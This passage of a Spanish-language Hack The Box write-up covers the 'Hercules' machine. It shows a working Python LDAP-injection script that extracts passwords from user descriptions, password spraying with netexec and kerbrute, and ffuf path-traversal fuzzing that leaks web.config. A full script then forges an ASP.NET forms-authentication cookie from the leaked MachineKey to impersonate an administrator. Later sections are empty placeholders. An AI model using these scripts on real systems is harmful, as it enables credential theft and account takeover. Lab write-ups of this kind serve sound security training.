# Enumerando atributos description/password caracter por caracter
def enumerate_description(username):

        # Comprobando si usuario tiene el atributo description
        if not ldapInjection(username):
                return None
        print(colored(f"User {username} has a description field, enumerating...", 'light_cyan'))

        description = ""
        no_char_count = 0

        p3 = log.progress(colored("Test", 'green'))

        for position in range(50):
                found = False

                for char in characters:
                        test_desc = description + char

                        if ldapInjection(username, test_desc):
                                description += char
                                p3.status(colored(f"Testing in {position} positon: '{char}' -> Current: {description}", 'light_green'))
                                found = True
                                no_char_count = 0
                                break

                        # Pequeño delay para evadir el rate limiting
                        time.sleep(0.01)

                if not found:
                        no_char_count += 1
                        if no_char_count >= 2: # Se detiene despues de 2 posiciones sin careacteres
                                break

        if description:
                print(colored(f"[+] Complete: {username} => {description}", 'magenta'))
                return description
        return None

def main():
        print(colored("#"*60, 'light_green'))
        print(colored("\t Hercules LDAP Description/Password Enumeration", 'light_green'))
        print(colored(f"\t\t Testing {len(KerbUsers)} users", 'light_green'))
        print(colored("#"*60, 'light_green'))
        print()

        p1 = log.progress(colored("LDAP Injections", 'cyan'))
        p1.status(colored("Starting Injections On Hercules Login", 'light_red'))

        time.sleep(0.2)

        found_passwords = {}

        p2 = log.progress(colored("Checking", 'yellow'))

        for user in KerbUsers:

                p2.status(colored(f"Enumerating {user} description", 'blue'))

                password = enumerate_description(user)

                if password:
                        found_passwords[user] = password
                        print(colored(f"\n[+] FOUND: {user}:{password}\n", 'light_yellow'))


        print(colored("\n" + "="*60, 'light_green'))
        print(colored("\t\tENUMERATION COMPLETE", 'light_green'))
        print(colored("="*60, 'light_green'))

        if found_passwords:
                print(colored(f"\nFound {len(found_passwords)} passwords:", 'yellow'))
                for user, pwd in found_passwords.items():
                        print(colored(f" {user}: {pwd}", 'green'))
        else:
                print(colored("\nNo passwords found", 'red'))

if __name__ == "__main__":
        main()
```

Ejecutemos el script para obtener alguna contraseña:
```bash
 python3 LDAPinjection.py
############################################################
	 Hercules LDAP Description/Password Enumeration
		 Testing 34 users
############################################################

[◓] LDAP Injections: Starting Injections On Hercules Login
[../.....] Checking: Enumerating zeke.s description
User johnathan.j has a description field, enumerating...
[-] Test: Testing in 22 positon: '!' -> Current: change*th1s_p@ssw()rd!!
[+] Complete: johnathan.j => change*th1s_p@ssw()rd!!

[+] FOUND: johnathan.j:change*th1s_p@ssw()rd!!


============================================================
		ENUMERATION COMPLETE
============================================================

Found 1 passwords:
 johnathan.j: change*th1s_p@ssw()rd!!
```
Excelente, obtuvimos la contraseña del **usuario johnathan.j**.

Podemos comprobar si la contraseña sirve para este usuario:
```bash
nxc ldap 10.10.11.91 -u 'johnathan.j' -p 'change*th1s_p@ssw()rd!!'
LDAP        10.10.11.91     389    DC               [*] None (name:DC) (domain:hercules.htb)
LDAP        10.10.11.91     389    DC               [-] hercules.htb\johnathan.j:change*th1s_p@ssw()rd!! STATUS_NOT_SUPPORTED
```
No parece funcionar.

Aun así, esta contraseña puede pertenecer a otro usuario y para evitar cualquier restricción, usaremos el **ataque Password Spraying**.

<br>

<h3 id="pwdSpray">Aplicando Ataque Password Spraying para Identificar Reuso de Contraseña Dumpeada</h3>

Para este ataque, podemos usar **netexec** de forma similar a como lo aplicamos con **crackmapexec**:
```bash
nxc ldap 10.10.11.91 -u only_names.txt -p 'change*th1s_p@ssw()rd!!' -k --continue-on-success
LDAP        10.10.11.91     389    DC               [*] None (name:DC) (domain:hercules.htb)
LDAP        10.10.11.91     389    DC               [-] hercules.htb\adriana.i:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
...
LDAP        10.10.11.91     389    DC               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!!
...
```
Muy bien, vemos que el **usuario ken.w** utiliza esta contraseña.

Ahora probemos con **kerbrute**:
```bash
./kerbrute_linux_386 passwordspray -d hercules.htb --dc 10.10.11.91 only_names.txt 'change*th1s_p@ssw()rd!!'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/27/25 - Ronnie Flathers @ropnop

2025/10/27 23:31:12 >  Using KDC(s):
2025/10/27 23:31:12 >  	10.10.11.91:88

2025/10/27 23:31:13 >  [+] VALID LOGIN:	 ken.w@hercules.htb:change*th1s_p@ssw()rd!!
2025/10/27 23:31:13 >  Done! Tested 33 logins (1 successes) in 0.978 seconds
```
De igual forma, obtenemos al **usuario ken.w**.

Como es la contraseña valida para **LDAP**, podemos probarla en el login y ver si nos da acceso:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura9.png">
</p>

Genial, estamos dentro.

<br>

<h2 id="LFI">Aplicando Local File Inclusion (LFI) en Dashboard de Página Web</h2>

Navegando un poco en el Dashboard, vemos que hay 3 mensajes para nosotros en la sección de **Email**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura10.png">
</p>

Revisando estos mensajes, uno de estos nos indican la razón del uso de credenciales LDAP para entrar al login:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura11.png">
</p>

El segundo nos indica que nuestra cuenta fue hackeada y debemos cambiar la contraseña inmediatamente, dandonos un dominio interno para realizar ese cambio:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura12.png">
</p>

Y el tercer mensaje es solo un aumento de sueldo, nada importante.

Revisando las demás secciones, vemos la sección de **Download** que nos permite descargar algunos formularios.

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura13.png">
</p>

Al capturar la descarga con **BurpSuite**, vemos el uso de un parámetro para consultar el formulario a descargar:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura14.png">
</p>

Esta clase de parámetros pueden ser vulnerables a **Local File Inclusion** o **Path Traversal**.

Podemos comprobarlo aplicando **Fuzzing** a este parámetro, usando un wordlist con ruta del **servidor IIS** de **Windows**.

Usare la herramienta **ffuf** y será necesario copiar la cookie de sesión:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/Web-Servers/IIS.txt:FUZZ -u 'https://hercules.htb/Home/Download?fileName=../../FUZZ' -t 300 -b "__RequestVerificationToken=...; .ASPXAUTH=..." -fs 0,485

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://hercules.htb/Home/Download?fileName=../../FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/Web-Servers/IIS.txt
 :: Header           : Cookie: __RequestVerificationToken=FUo8Ej-XLwahBPYI4N9TpS6dxMAlf_FhjRk25mkOFQ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0,485
________________________________________________

web.config              [Status: 200, Size: 4896, Words: 643, Lines: 94, Duration: 432ms]
:: Progress: [216/216] :: Job [1/1] :: 109 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

| Parámetros | Descripción |
|--------------------------|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-b*	     | Para indicar la cookie a usar. |

<br>

Tenemos un resultado.

Revisemoslo:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura15.png">
</p>

Bien, podemos ver el archivo **web.config**.

Analizando este archivo, podemos ver una sección interesante que es la etiqueta **MachineKey**.

<br>

<h2 id="FormsAuth">Forjando Cookie de Forms Authentication de ASP.NET con un Script</h2>

¿Qué es **MachineKey**?

| **MachineKey** |
|:--------------:|
| *Define las claves que ASP.NET usa para validar (MAC) datos (por ejemplo ViewState, cookies forms auth, etc.) usando `validationKey` y el algoritmo `HMACSHA256`, y Desencriptar datos cuando `decryption` está activado (aquí `AES`) usando `decryptionKey`.* |

<br>

La idea es que con estas llaves podamos crear una cookie de sesión válida de algún usuario.

Sin embargo, tenemos que tener en cuenta el proceso que **ASP.NET** (en versiones anteriores a **ASP.NET Core**) usa para proteger las cookies de autenticación, pues si revisas la cookie del login, verás una cookie llamda **.ASPXAUTH**.

| **Cookie .ASPXAUTH** |
|:--------------------:|
| *Es la cookie de autenticación por formularios (Forms Authentication) de ASP.NET. Su propósito es mantener la sesión autenticada de un usuario sin necesidad de volver a iniciar sesión en cada petición. ASP.NET la crea después de que un usuario se autentica correctamente (por ejemplo, desde /Login.aspx).* |

<br>

Esto se vuelve más complejo, pues para que podamos formar una cookie valida debemos tener también en cuenta la compatibilidad entre cookies de sesión viejas y modernas, pues puede que tengamos algun problema a la hora de forjar una cookie solo para versiones viejas de **ASP.NET**.

Por esta razón fue creado el paquete **AspNetCore.LegacyAuthCookieCompat**, para resolver esa incompatibilidad:

| **Paquete AspNetCore.LegacyAuthCookieCompat** |
|:---------------------------------------------:|
| *Es una biblioteca de compatibilidad (“compat”) que implementa el mismo formato de ticket, cifrado y firma que usaba el viejo System.Web.Security.FormsAuthentication. Permite a las aplicaciones en .NET Core leer, descifrar, firmar y crear cookies .ASPXAUTH de ASP.NET clásico.* |

<br>

Con estos conceptos ya vistos, podemos empezar a forjar una cookie de **Forms Authentication**, usando los datos del **MachineKey**.

Para eso utilizaremos un script de **Python** que automatiza el uso de un script de **C#**, para generar una cookie válida que nos ayude a suplantar un usuario como el **web_admin**.

Este script utiliza **dotnet**, por lo que debes tenerlo instalado en tu máquina.

Yo lo instale de la siguiente manera:
```bash
# Descargando instalador de dotnet
wget https://dot.net/v1/dotnet-install.sh -O dotnet-install.sh

# Dando permisos y ejecutando instalador para obtener versión 7
chmod +x dotnet-install.sh
./dotnet-install.sh --channel 7.0

# Guardando el uso de dotnet en la zshrc
echo 'export DOTNET_ROOT=$HOME/.dotnet' >> ~/.zshrc
echo 'export PATH=$PATH:$HOME/.dotnet:$HOME/.dotnet/tools' >> ~/.zshrc
source ~/.zshrc
```

Una vez que tengas instalado **dotnet** copia y pega el siguiente script en tu máquina:
```bash
#!/usr/bin/env python3
import os
import subprocess
import textwrap
import shutil
import sys

# --- CONFIG ---
validation_key = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80"
decryption_key = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
username = "web_admin"
user_data = "Web Administrators"
cookie_path = "/"
project_dir = "legacy_auth_auto"
# ----------------

program_cs = f"""using System;
using AspNetCore.LegacyAuthCookieCompat;

public static class HexUtils
{{
    public static byte[] HexToBinary(string hex)
    {{
        if (hex == null) throw new ArgumentNullException(nameof(hex));
        if (hex.Length % 2 != 0) throw new ArgumentException("Hex string must have even length");
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < bytes.Length; i++)
        {{
            bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }}
        return bytes;
    }}
}}

class Program
{{
    static void Main(string[] args)
    {{
        string validationKey = "{validation_key}";
        string decryptionKey = "{decryption_key}";

        if (validationKey.Length > 128)
        {{
            validationKey = validationKey.Substring(0, 128);
        }}

        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

        var issueDate = DateTime.Now;
        var expiryDate = issueDate.AddHours(1);

        var formsAuthenticationTicket = new FormsAuthenticationTicket(
            1,
            "{username}",
            issueDate,
            expiryDate,
            false,
            "{user_data}",
            "{cookie_path}"
        );

        var legacyEncryptor = new LegacyFormsAuthenticationTicketEncryptor(
            decryptionKeyBytes,
            validationKeyBytes,
            ShaVersion.Sha256
        );

        var encryptedText = legacyEncryptor.Encrypt(formsAuthenticationTicket);
        Console.WriteLine("Encrypted FormsAuth Ticket:");
        Console.WriteLine(encryptedText);
    }}
}}
"""

def run(cmd, cwd=None, capture=False):
    print(f"> {' '.join(cmd)}")
    return subprocess.run(cmd, cwd=cwd, check=True, text=True, capture_output=capture)

def main():
    # check dotnet available
    if shutil.which("dotnet") is None:
        print("ERROR: 'dotnet' no está en PATH. Instala .NET SDK y vuelve a intentar.")
        sys.exit(1)

    if os.path.exists(project_dir):
        print(f"El directorio '{project_dir}' ya existe. Por seguridad, bórralo o cambia project_dir.")
        sys.exit(1)

    os.makedirs(project_dir, exist_ok=True)

    # dotnet new console
    run(["dotnet", "new", "console", "-o", project_dir])

    # add package
    run(["dotnet", "add", project_dir, "package", "AspNetCore.LegacyAuthCookieCompat", "--version", "2.0.5"])

    # overwrite Program.cs
    program_path = os.path.join(project_dir, "Program.cs")
    with open(program_path, "w") as f:
        f.write(program_cs)

    # restore & build
    run(["dotnet", "restore", project_dir])
    run(["dotnet", "build", project_dir])

    # run and capture output
    proc = subprocess.run(["dotnet", "run", "--project", project_dir], text=True, capture_output=True)
    print(proc.stdout)
    if proc.stderr:
        print("--- STDERR ---")
        print(proc.stderr)

if __name__ == "__main__":
    main()
```

Ahora ejecútalo:
```bash
python3 generate_forms_cookie.py
> dotnet new console -o legacy_auth_auto
...
Compilación correcta.
    0 Advertencia(s)
    0 Errores

Tiempo transcurrido 00:00:08.92
Encrypted FormsAuth Ticket:
F44A8A86A97127947E859D90E487A...
```

Copia la cookie y pegala en la sesión actual de la página web utilizando el **Inspector** de tu navegador:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura16.png">
</p>

Recarga la página:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura17.png">
</p>

Muy bien, somos el **usuario web_admin**.

<br>

<h2 id="MaliciousODT">Cargando Archivo ODT Malicioso para Capturar y Crackear Hash Net NTLMv2</h2>

```bash

```

```bash

```

```bash

```

```bash

```


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```

<br>

<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```


<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


links


<br>
# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
